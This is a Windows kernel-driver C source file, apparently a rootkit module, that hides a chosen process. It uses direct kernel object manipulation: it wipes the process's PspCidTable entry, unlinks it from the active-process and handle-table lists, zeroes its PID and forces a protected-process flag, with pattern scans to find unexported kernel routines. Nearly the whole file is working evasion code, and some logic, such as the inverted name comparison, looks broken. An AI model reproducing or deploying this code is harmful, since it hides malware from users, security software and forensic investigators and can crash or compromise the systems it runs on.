#include "HideProcess.h"
#include "structs.h"

EXTERN_C NTKERNELAPI PCHAR PsGetProcessImageFileName(__in PEPROCESS Process);

ULONG GetActiveProcessLinksOffset();
PEPROCESS ForceFindProcessByName(PCHAR szName);
HANDLE FindProcessIdByName(PCHAR szName);


PEPROCESS ForceFindProcessByName(PCHAR szName)
{
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS Process = NULL;
    PCHAR ProcessPathName = NULL;

    for (ULONG64 i = 4; i < 0x10000000; i += 4)
    {
        status = PsLookupProcessByProcessId((HANDLE)i, &Process);
        if (!NT_SUCCESS(status))
            continue;
        ObfDereferenceObject(Process);
        ProcessPathName = PsGetProcessImageFileName(Process);
        if (!ProcessPathName)
            continue;
        DbgPrint("%s \r\n", ProcessPathName);
        if (strstr(ProcessPathName, szName) != 0)
            return Process;
    }
    return NULL;
}


HANDLE FindProcessIdByName(PCHAR szName)
{
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS Process = NULL;
    PCHAR ProcessName = NULL;
    PLIST_ENTRY pHead = NULL;
    PLIST_ENTRY pNode = NULL;

    ULONG64 ActiveProcessLinksOffset = GetActiveProcessLinksOffset();
    if (!ActiveProcessLinksOffset)
    {
        KdPrint(("GetActiveProcessLinksOffset failed\n"));
        return NULL;
    }
    Process = PsGetCurrentProcess();

    pHead = (PLIST_ENTRY)((ULONG64)Process + ActiveProcessLinksOffset);
    pNode = pHead;

    do
    {
        Process = (PEPROCESS)((ULONG64)pNode - ActiveProcessLinksOffset);
        ProcessName = PsGetProcessImageFileName(Process);
        if (strcmp(szName, ProcessName))
        {
            return *(HANDLE*)((ULONG64)pNode - 8);
        }
        pNode = pNode->Flink;
    } while (pNode != pHead);

    return NULL;
}


ULONG GetActiveProcessLinksOffset()
{
    UNICODE_STRING FunName = { 0 };
    RtlInitUnicodeString(&FunName, L"PsGetProcessId");

    /*
    .text:000000014007E054                   PsGetProcessId  proc near
    .text:000000014007E054
    .text:000000014007E054 48 8B 81 80 01 00+                mov     rax, [rcx+180h]
    .text:000000014007E054 00
    .text:000000014007E05B C3                                retn
    .text:000000014007E05B                   PsGetProcessId  endp
    */

    PUCHAR pfnPsGetProcessId = (PUCHAR)MmGetSystemRoutineAddress(&FunName);
    if (pfnPsGetProcessId && MmIsAddressValid(pfnPsGetProcessId) && MmIsAddressValid(pfnPsGetProcessId + 0x7))
        for (size_t i = 0; i < 0x7; i++)
            if (pfnPsGetProcessId[i] == 0x48 && pfnPsGetProcessId[i + 1] == 0x8B)
                return *(PULONG)(pfnPsGetProcessId + i + 3) + 8;
    return 0;
}


//Win10-11 Only
ULONG GetProtectionOffset()
{
    UNICODE_STRING FunName = { 0 };
    RtlInitUnicodeString(&FunName, L"PsIsProtectedProcess");

    /*
    .text:0000000140203410                   PsIsProtectedProcess proc near          ; CODE XREF: NtQueryInformationProcess+735¡ýp
    .text:0000000140203410                                                           ; PspAllocateProcess+1E3B¡ýp
    .text:0000000140203410                                                           ; DATA XREF: ...
    .text:0000000140203410 F6 81 7A 08 00 00+                test    byte ptr [rcx+87Ah], 7
    .text:0000000140203410 07
    .text:0000000140203417 B8 00 00 00 00                    mov     eax, 0
    .text:000000014020341C 0F 97 C0                          setnbe  al
    .text:000000014020341F C3                                retn
    .text:000000014020341F                   PsIsProtectedProcess endp
    */

    PUCHAR pfnPsIsProtectedProcess = (PUCHAR)MmGetSystemRoutineAddress(&FunName);
    if (pfnPsIsProtectedProcess && MmIsAddressValid(pfnPsIsProtectedProcess) && MmIsAddressValid(pfnPsIsProtectedProcess + 0x10))
        for (size_t i = 0; i < 0x10; i++)
            if (pfnPsIsProtectedProcess[i] == 0xF6 && pfnPsIsProtectedProcess[i + 1] == 0x81 && pfnPsIsProtectedProcess[i + 7] == 0xB8)
                return *(PULONG)(pfnPsIsProtectedProcess + i + 2);
    return 0;
}


//Win10-11 Only
NTSTATUS SetProtectionStatus(PEPROCESS Process)
{
    NTSTATUS status = STATUS_SUCCESS;
    ULONG ProtectionOffset = 0;

    if (!MmIsAddressValid(Process))
    {
        return STATUS_UNSUCCESSFUL;
    }
    ProtectionOffset = GetProtectionOffset();
    if (!ProtectionOffset)
    {
        return STATUS_UNSUCCESSFUL;
    }
    *(ULONG*)((ULONG64)Process + ProtectionOffset) = 0x40000051;
    return status;
}

ULONG64 FindPattern(ULONG64 base, SIZE_T size, PCHAR pattern, PCHAR mask)
{
    const auto patternSize = strlen(mask);

    for (size_t i = 0; i < size - patternSize; i++) {
        for (size_t j = 0; j < patternSize; j++) {
            if (mask[j] != '?' && *(PUCHAR)(base + i + j) != (UCHAR)(pattern[j]))
                break;

            if (j == patternSize - 1)
                return (ULONG64)base + i;
        }
    }
    return 0;
}

PVOID GetExpLookupHandleTableEntryFunc()
{
    UNICODE_STRING FunName = { 0 };
    PUCHAR pfnPsLookupProcessByProcessId;
    PUCHAR pfnPspReferenceCidTableEntry;
    PUCHAR pfnExpLookupHandleTableEntry;

    RtlInitUnicodeString(&FunName, L"PsLookupProcessByProcessId");
    pfnPsLookupProcessByProcessId = (PUCHAR)MmGetSystemRoutineAddress(&FunName);

    PUCHAR found = (PUCHAR)FindPattern((ULONG64)pfnPsLookupProcessByProcessId, 0x1000,
        "\x66\xFF\x8F\x00\x00\x00\x00\xB2\x03\xE8\x00\x00\x00\x00\x48\x8B\xD8\x48\x85\xC0",
        "xxx????xxx????xxxxxx");
    if (!found)
        return NULL;
    pfnPspReferenceCidTableEntry = (found + 9) + *(PLONG)(found + 10) + 5;
    found = (PUCHAR)FindPattern((ULONG64)pfnPspReferenceCidTableEntry, 0x1000,
        "\x48\x8B\xD1\x48\x8B\xC8\xE8\x00\x00\x00\x00\x48\x8B\xF0\x48\x85\xC0",
        "xxxxxxx????xxxxxx");
    if (!found)
        return NULL;

    pfnExpLookupHandleTableEntry = (found + 6) + *(PLONG)(found + 7) + 5;
    return pfnExpLookupHandleTableEntry;
}

PVOID GetPspCidTable()
{
    UNICODE_STRING FunName = { 0 };
    PUCHAR pfnPsLookupProcessByProcessId;
    PUCHAR pfnPspReferenceCidTableEntry;
    PUCHAR PspCidTable;

    RtlInitUnicodeString(&FunName, L"PsLookupProcessByProcessId");
    pfnPsLookupProcessByProcessId = (PUCHAR)MmGetSystemRoutineAddress(&FunName);

    PUCHAR found = (PUCHAR)FindPattern((ULONG64)pfnPsLookupProcessByProcessId, 0x1000,
        "\x66\xFF\x8F\x00\x00\x00\x00\xB2\x03\xE8\x00\x00\x00\x00\x48\x8B\xD8\x48\x85\xC0",
        "xxx????xxx????xxxxxx");
    if (!found)
        return NULL;
    pfnPspReferenceCidTableEntry = (found + 9) + *(PLONG)(found + 10) + 5;
    found = (PUCHAR)FindPattern((ULONG64)pfnPspReferenceCidTableEntry, 0x1000,
        "\x48\x83\xEC\x00\x48\x8B\x05\x00\x00\x00\x00\x0F\xB6\xEA\xF7\xC1\x00\x00\x00\x00\x0F\x84",
        "xxx?xxx????xxxxx????xx");
    if (!found)
        return NULL;

    PspCidTable = (found + 4) + *(PLONG)(found + 7) + 7;
    return PspCidTable;
}

PVOID __fastcall MyExpLookupHandleTableEntry(PHANDLE_TABLE PspCidTable, HANDLE Handle)
{
    unsigned __int64 HandleValue; // rdx
    volatile unsigned __int64 TableBase; // r8
    volatile unsigned __int64 TableLevel;

    HandleValue = (ULONG64)Handle & 0xFFFFFFFFFFFFFFFCui64;
    if (HandleValue >= PspCidTable->NextHandleNeedingPool)
        return NULL;
    TableBase = PspCidTable->TableCode;
    TableLevel = (ULONG)(TableBase & 3);
    if (TableLevel == 1)
        return (PVOID)(*(ULONG64*)(TableBase + 8 * (HandleValue >> 10) - 1) + 4 * (HandleValue & 0x3FF));
    if (TableLevel != 0)
        return (PVOID)(*(ULONG64*)(*(ULONG64*)(TableBase + 8 * (HandleValue >> 19) - 2)
            + 8 * ((HandleValue >> 10) & 0x1FF))
            + 4 * (HandleValue & 0x3FF));
    return (PVOID)(TableBase + 4 * HandleValue);
}

NTSTATUS HideProcessByProcessId(HANDLE ProcessId)
{
    NTSTATUS status = STATUS_SUCCESS;
    PEPROCESS Process = NULL;

	ULONG ActiveProcessLinksOffset = 0;
	ULONG HandleTableOffset = 0x570;

	typedef PULONG64(NTAPI* pfnExpLookupHandleTableEntry)(PHANDLE_TABLE PspCidTable, HANDLE pid);
    pfnExpLookupHandleTableEntry ExpLookupHandleTableEntry = NULL;
    POBJECT_HEADER ObjectHeader = NULL;
    PHANDLE_TABLE PspCidTable = 0;

    //DbgBreakPoint();

    KdPrint(("[*] HideProcessByProcessId(%lld)\n", (ULONG64)ProcessId));
    status = PsLookupProcessByProcessId(ProcessId, &Process);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("PsLookupProcessByProcessId failed\n"));
        return status;
    }
    KdPrint(("EPROCESS = %p\n", Process));
    ObjectHeader = (POBJECT_HEADER)((ULONG64)Process - 0x30);

    ExpLookupHandleTableEntry = (pfnExpLookupHandleTableEntry)GetExpLookupHandleTableEntryFunc();
    if (!ExpLookupHandleTableEntry)
    {
        KdPrint(("ExpLookupHandleTableEntry failed\n"));
        //return STATUS_UNSUCCESSFUL;
        ExpLookupHandleTableEntry = (pfnExpLookupHandleTableEntry)MyExpLookupHandleTableEntry;
    }
    PspCidTable = (PHANDLE_TABLE)GetPspCidTable();
    if (!PspCidTable)
    {
        KdPrint(("PspCidTable failed\n"));
        return STATUS_UNSUCCESSFUL;
    }
    ActiveProcessLinksOffset = GetActiveProcessLinksOffset();
    if (!ActiveProcessLinksOffset)
    {
        KdPrint(("GetActiveListOffset failed\n"));
        return STATUS_UNSUCCESSFUL;
    }

    PVOID CidTableItem = ExpLookupHandleTableEntry(PspCidTable, ProcessId);
    KdPrint(("CidTableItem = %p\n", CidTableItem));

    KeEnterCriticalRegion();

    memset(CidTableItem, 0, 0x10);   //Wipe Handle in PspCidTable
    SetProtectionStatus(Process);
    
    /*
    +0x01b Flags            : 0x71 'q'
	+0x01b NewObject        : 0y1
	+0x01b KernelObject     : 0y0
	+0x01b KernelOnlyAccess : 0y0
	+0x01b ExclusiveObject  : 0y0
	+0x01b PermanentObject  : 0y1
	+0x01b DefaultSecurityQuota : 0y1
	+0x01b SingleHandleEntry : 0y1
	+0x01b DeletedInline    : 0y0
    */

    ObjectHeader->NewObject = 1;
    ObjectHeader->KernelOnlyAccess = 1;
    ObjectHeader->PermanentObject = 1;
    ObjectHeader->DefaultSecurityQuota = 1;

    PLIST_ENTRY ActiveProcessLinksAddress = (PLIST_ENTRY)((PUCHAR)Process + ActiveProcessLinksOffset);
    RemoveEntryList(ActiveProcessLinksAddress);
    InitializeListHead(ActiveProcessLinksAddress);  //SelfConnected

    PHANDLE_TABLE ObjectTable = *(PHANDLE_TABLE*)((PUCHAR)Process + HandleTableOffset);
    PLIST_ENTRY HandleTableListAddress = &ObjectTable->HandleTableList;
	RemoveEntryList(HandleTableListAddress);
    InitializeListHead(HandleTableListAddress);

    //Will trigger BSOD if pid not exist on Win7
    ULONG64 UniqueProcessIdAddress = (ULONG64)Process + ActiveProcessLinksOffset - 8;
    *(PULONG64)(UniqueProcessIdAddress) = 0x0;    //ProcessId 

    KeLeaveCriticalRegion();

    ObDereferenceObject(Process);
    return status;
}


NTSTATUS HideProcessByName(PCHAR szName)
{
    NTSTATUS status = STATUS_SUCCESS;
    HANDLE ProcessId = NULL;

    ProcessId = FindProcessIdByName(szName);
    if (!ProcessId)
    {
        KdPrint(("FindProcessByName failed\n"));
        return STATUS_UNSUCCESSFUL;
    }

    HideProcessByProcessId(ProcessId);
    return status;
}


